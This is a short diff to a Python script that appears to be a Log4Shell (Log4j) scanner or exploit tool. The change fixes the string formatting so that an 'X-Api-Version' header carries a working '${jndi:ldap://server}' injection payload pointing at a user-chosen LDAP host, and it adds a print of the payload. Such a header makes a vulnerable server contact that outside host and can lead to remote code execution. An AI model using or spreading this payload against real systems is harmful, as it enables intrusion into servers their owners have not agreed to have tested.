@@ -132,7 +132,9 @@ def main():
     try:
         # Check if --server or --payload is used and build dict(payload) accordingly
         if args.server is not None:
-            payload = { 'X-Api-Version' : "${{jndi:ldap://{args.server}}}" }
+            server = args.server
+            payload = { 'X-Api-Version' : f"${{jndi:ldap://{server}}}" }
+            print(payload)
         elif args.payload is not None:
             header_key, colon, header_val = args.payload.partition(':')
             payload = { header_key : header_val }
